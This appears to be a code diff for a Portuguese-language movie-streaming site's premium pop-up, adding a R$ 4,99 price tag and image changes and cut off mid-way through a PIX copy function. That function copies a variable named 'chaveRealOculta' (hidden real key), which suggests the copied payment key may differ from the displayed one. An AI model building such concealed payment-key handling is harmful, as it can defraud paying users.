@@ -244,11 +244,13 @@
         }
 
         .btn-close-ad:hover { background: rgba(225, 29, 72, 0.9); }
+        
+        /* Nova imagem temática com tema de Cinema/Streaming Premium */
         .ad-image {
             width: 100%;
             height: 180px;
             background: linear-gradient(to bottom, transparent 40%, #1e293b 100%),
-                        url('https://i.postimg.cc/SQY14qCS/c43416af-3729-49db-82f7-9f17bdea0bff-m.jpg') no-repeat center center;
+                        url('https://images.unsplash.com/photo-1489599849927-2ee91cede3ba?q=80&w=600&auto=format&fit=crop') no-repeat center center;
             background-size: cover;
         }
 
@@ -258,13 +260,22 @@
         .ad-content h3 {
             font-size: 24px;
             font-weight: 800;
-            margin-bottom: 12px;
+            margin-bottom: 6px;
             background: linear-gradient(to right, #f43f5e, #fb7185);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
 
+        .price-tag {
+            font-size: 20px;
+            font-weight: 800;
+            color: #22c55e;
+            margin-bottom: 14px;
+            display: block;
+        }
+
         .ad-content p { color: #94a3b8; font-size: 15px; line-height: 1.5; margin-bottom: 20px; }
+        
         .btn-premium {
             width: 100%;
             padding: 14px;
@@ -355,13 +366,16 @@
     <!-- POP-UP PREMIUM -->
     <div class="ad-overlay" id="adPopup">
         <div class="ad-card">
+            <!-- Botão fechar funcional -->
             <button class="btn-close-ad" onclick="fecharAnuncio()">×</button>
             
             <div id="offerScreen" class="ad-screen">
                 <div class="ad-image"></div>
                 <div class="ad-content">
                     <h3>Seja Premium</h3>
+                    <span class="price-tag">Por apenas R$ 4,99</span>
                     <p>Desbloqueie todos os filmes em Ultra HD, faça downloads e assista aos seus títulos favoritos sem interrupções de anúncios!</p>
+                    <!-- Botão avançar funcional -->
                     <button class="btn-premium" onclick="mostrarPagamento()">Garantir Acesso Premium</button>
                 </div>
             </div>
@@ -534,14 +548,4 @@
         }
 
         function copiarPix() {
-            if (navigator.clipboard && window.isSecureContext) {
-                navigator.clipboard.writeText(chaveRealOculta).then(mostrarFeedback);
-            } else {
-                const textArea = document.createElement("textarea");
-                textArea.value = chaveRealOculta;
-                textArea.style.position = "fixed"; 
-                document.body.appendChild(textArea);
-                textArea.focus();
-                textArea.select();
-                try {
-     
+            if (navigator.clipboard 
